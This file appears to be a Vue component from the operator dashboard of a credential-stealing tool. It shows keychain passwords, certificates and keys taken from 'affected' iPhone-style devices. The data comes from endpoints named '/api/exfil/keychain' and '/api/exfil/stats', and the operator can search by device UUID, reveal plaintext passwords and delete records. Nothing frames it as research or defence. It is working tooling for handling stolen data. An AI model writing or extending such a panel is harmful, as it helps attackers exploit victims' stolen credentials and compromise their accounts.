<template>
  <div class="keychain">
    <!-- Stats -->
    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><Key /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.by_category?.keychain || 0 }}</div>
              <div class="stat-label">Total Keychain</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #e6a23c;">
              <el-icon size="28"><Iphone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.devices || 0 }}</div>
              <div class="stat-label">Affected Devices</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><Lock /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ passwordCount }}</div>
              <div class="stat-label">Passwords</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><Key /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ certificateCount }}</div>
              <div class="stat-label">Certs / Keys</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <!-- Toolbar -->
    <el-card>
      <div class="toolbar">
        <div class="search-bar">
          <el-input v-model="filters.device_uuid" placeholder="Device UUID" style="width: 250px;" />
          <el-input v-model="filters.account" placeholder="Account" style="width: 200px;" />
          <el-select v-model="filters.service" placeholder="Service Type">
            <el-option label="All" value="" />
            <el-option label="Password" value="password" />
            <el-option label="Certificate" value="certificate" />
            <el-option label="Key" value="key" />
          </el-select>
          <el-button type="primary" @click="loadKeychain">Search</el-button>
          <el-button @click="resetFilters">Reset</el-button>
        </div>
      </div>
      
      <el-table :data="keychainData" border v-loading="loading">
        <el-table-column prop="id" label="ID" width="80" />
        <el-table-column prop="device_uuid" label="Device UUID" width="250" show-overflow-tooltip />
        <el-table-column prop="service" label="Service" width="150">
          <template #default="scope">
            <el-tag :type="getServiceType(scope.row.service)">{{ getServiceName(scope.row.service) }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="account" label="Account" />
        <el-table-column prop="password" label="Password" show-overflow-tooltip>
          <template #default="scope">
            <span>{{ scope.row.password || '******' }}</span>
            <el-button size="small" @click="togglePassword(scope.row)" v-if="scope.row.password">Show</el-button>
          </template>
        </el-table-column>
        <el-table-column prop="created_at" label="Created At" width="180" />
        <el-table-column label="Actions" width="100">
          <template #default="scope">
            <el-button size="small" type="danger" @click="deleteItem(scope.row.id)">Delete</el-button>
          </template>
        </el-table-column>
      </el-table>
      
      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted, computed } from 'vue'
import axios from '../utils/axios'
import { Key, Iphone, Lock } from '@element-plus/icons-vue'

const keychainData = ref([])
const loading = ref(false)
const stats = ref({})

const filters = reactive({
  device_uuid: '',
  account: '',
  service: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

const passwordCount = computed(() => keychainData.value.filter(item => item.service === 'password').length)
const certificateCount = computed(() => keychainData.value.filter(item => item.service !== 'password').length)

function getServiceType(service) {
  const types = { 'password': 'warning', 'certificate': 'success', 'key': 'danger' }
  return types[service] || 'info'
}

function getServiceName(service) {
  const names = { 'password': 'Password', 'certificate': 'Certificate', 'key': 'Key' }
  return names[service] || service
}

function togglePassword(row) {
  row.password = row.password === '******' ? row.original_password : '******'
}

async function loadStats() {
  try {
    const response = await axios.get('/api/exfil/stats')
    stats.value = response.data
  } catch (error) {
    console.error('Failed to load stats:', error)
  }
}

async function loadKeychain() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.account) params.append('account', filters.account)
    if (filters.service) params.append('service', filters.service)
    
    const response = await axios.get(`/api/exfil/keychain?${params}`)
    keychainData.value = response.data.map(item => ({ ...item, password: item.password ? '******' : '', original_password: item.password }))
  } catch (error) {
    console.error('Failed to load data:', error)
  } finally {
    loading.value = false
  }
}

async function deleteItem(id) {
  if (!confirm('Delete this record?')) return
  try {
    await axios.delete(`/api/exfil/${id}`)
    loadKeychain()
    loadStats()
  } catch (error) {
    console.error('Delete failed:', error)
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.account = ''
  filters.service = ''
  loadKeychain()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadKeychain()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadKeychain()
}

onMounted(() => {
  loadStats()
  loadKeychain()
})
</script>

<style scoped>
.stats-row {
  margin-bottom: 15px;
}

.stat-card {
  display: flex;
  align-items: center;
  gap: 15px;
}

.stat-icon {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: bold;
  color: #333;
}

.stat-label {
  font-size: 14px;
  color: #999;
  margin-top: 5px;
}

.toolbar {
  margin-bottom: 15px;
}

.search-bar {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}
</style>